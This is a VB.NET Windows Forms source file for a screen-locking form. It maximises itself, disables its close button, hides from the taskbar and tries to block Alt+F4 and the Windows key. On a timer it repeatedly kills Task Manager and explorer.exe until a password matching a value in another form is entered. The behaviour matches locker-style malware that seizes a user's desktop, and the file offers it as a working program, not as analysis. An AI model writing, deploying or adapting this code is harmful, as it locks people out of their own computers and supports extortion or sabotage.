Imports System.Diagnostics
Imports System.Windows.Forms

Public Class Form2
    Protected Overrides ReadOnly Property CreateParams As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.ShowInTaskbar = False
        TextBox1.UseSystemPasswordChar = True
        TextBox1.PasswordChar = "*"
        TextBox1.UseSystemPasswordChar = True
        Me.WindowState = Windows.Forms.FormWindowState.Maximized
        Timer1.Start()
    End Sub

    Private Sub fzh(sender As Object, e As Windows.Forms.KeyEventArgs) Handles Me.KeyDown
        If e.KeyCode = Windows.Forms.Keys.Alt And e.KeyCode = Windows.Forms.Keys.F4 Then
            Me.Show()
            e.Handled = True
        End If

        If e.KeyCode = Windows.Forms.Keys.W And e.KeyCode = Windows.Forms.Keys.Control Then

            Me.Show()
            e.Handled = True
        End If
        If e.KeyCode = Windows.Forms.Keys.Control And e.KeyCode = Windows.Forms.Keys.Alt Then
            Me.Show()
            e.Handled = True
        End If
        If e.KeyData = Windows.Forms.Keys.LWin Then
            Me.Show()
            e.Handled = True

        End If




        If e.KeyValue = 91 And e.KeyCode = Windows.Forms.Keys.F4 Then
            Me.Show()
            e.Handled = True
        End If

    End Sub
    Private Sub fh(sender As Object, e As Windows.Forms.KeyEventArgs) Handles Me.KeyUp
        If e.KeyCode = Windows.Forms.Keys.Alt And e.KeyCode = Windows.Forms.Keys.F4 Then
            Me.Show()
            e.Handled = True
        End If

        If e.KeyCode = Windows.Forms.Keys.W And e.KeyCode = Windows.Forms.Keys.Control Then

            Me.Show()
            e.Handled = True
        End If
        If e.KeyCode = Windows.Forms.Keys.Control And e.KeyCode = Windows.Forms.Keys.Alt Then
            Me.Show()
            e.Handled = True
        End If
        If e.KeyData = Windows.Forms.Keys.LWin Then
            Me.Show()
            e.Handled = True

        End If


        If e.KeyValue = 91 And e.KeyCode = Windows.Forms.Keys.F4 Then
            Me.Show()
            e.Handled = True
        End If

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ' Me.Select()
        '   Me.Focus()
        '  Me.BringToFront()
        '   Me.SetTopLevel(True)
        TextBox1.PasswordChar = "*"
        TextBox1.UseSystemPasswordChar = True
        If TextBox1.Text.Length > 0 Then
            TextBox1.UseSystemPasswordChar = True
        End If
        Try
            Dim TaskMgr() As Process = Process.GetProcessesByName("TaskMgr")
            For Each Process As Process In TaskMgr
                Process.Kill()
            Next

            Dim zae() As Process = Process.GetProcessesByName("explorer")
            For Each ezf4 As Process In zae
                ezf4.Kill()
            Next
            Dim azazeacazc() As Process = Process.GetProcessesByName("explorer.exe")
            For Each aczez As Process In azazeacazc
                aczez.Kill()
            Next
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Timer1sqd_Tick(sender As Object, e As KeyPressEventArgs) Handles Me.KeyPress
        If e.KeyChar = "87" Then
            e.Handled = True

        End If



    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        '   If TextBox1.Text = options(1) Then
        If TextBox1.Text = Form1.unlock Then
            Try


                Dim ExProcess = New Process()
                ExProcess.StartInfo.UseShellExecute = True
                ExProcess.StartInfo.CreateNoWindow = True

                ExProcess.StartInfo.FileName = "c:\windows\explorer.exe"
                ExProcess.StartInfo.WorkingDirectory = Application.StartupPath
                ExProcess.Start()
                Me.Close()
            Catch ex As Exception
            End Try
        End If
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged

    End Sub
End Class